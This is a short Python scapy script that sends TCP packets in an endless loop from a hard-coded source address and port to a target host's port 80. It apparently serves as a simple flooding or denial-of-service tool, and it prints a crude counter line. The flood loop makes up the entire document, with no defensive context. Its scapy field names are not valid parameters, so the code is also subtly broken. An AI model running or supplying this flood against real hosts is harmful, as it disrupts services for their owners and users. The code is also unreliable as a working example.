from scapy.all import *
source_IP = "192.168.1.223"  # input("Enter IP address of Source: ")
target_IP = "192.168.1.177"  # input("Enter IP address of Target: ")
source_port = 6900 #int(input("Enter Source Port Number:"))
i = 1

while True:
   IP1 = IP(source_IP=source_IP, destination=target_IP)
   TCP1 = TCP(srcport=source_port, dstport=80)
   pkt = IP1 / TCP1
   send(pkt, inter=.001)

   print("i like balls ", i)
   i = i + 1
